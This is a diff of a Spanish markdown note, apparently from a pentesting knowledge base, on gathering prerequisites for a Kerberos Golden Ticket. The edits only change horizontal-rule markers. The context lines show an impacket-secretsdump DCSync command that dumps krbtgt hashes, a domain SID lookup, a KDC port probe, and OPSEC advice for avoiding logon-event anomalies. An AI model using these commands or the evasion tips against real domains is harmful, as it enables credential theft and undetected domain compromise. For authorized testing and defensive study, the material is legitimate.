@@ -17,7 +17,7 @@ linked:
 
 # Golden Ticket - Prereqs y Recolección
 
-***
+---
 
 ## krbtgt NT hash (via DCSync)
 
@@ -39,7 +39,7 @@ impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-d
 # krbtgt:aes128-cts-hmac-sha1-96:<AES128HASH>
 ```
 
-___
+---
 
 ## krbtgt AES keys (preferred)
 
@@ -58,7 +58,7 @@ impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-d
 # krbtgt:aes256-cts-hmac-sha1-96:AAAAABBBBBCCCCC...
 ```
 
-___
+---
 
 ## Domain SID
 
@@ -86,7 +86,7 @@ impacket-lookupsid corp.local/administrator:'P@ssw0rd'@dc01.corp.local 0
 # S-1-5-21-1234567890-987654321-111222333
 ```
 
-___
+---
 
 ## FQDN y otros datos
 
@@ -98,7 +98,7 @@ ___
 | krbtgt RID | `502` (siempre fixed) | Para verificar hash correcto. |
 ^gt-pre-fqdn
 
-___
+---
 
 ## Verificación pre-forge
 
@@ -122,7 +122,7 @@ echo "=== KDC port ==="
 nc -zv dc01.corp.local 88 2>&1
 ```
 
-___
+---
 
 ## OPSEC pre-forge
 
@@ -134,4 +134,4 @@ ___
 | User real existente | "fakeadmin" no existe → 4624 anomaly | Usar "administrator" o user real |
 ^gt-pre-opsec
 
-***
+---
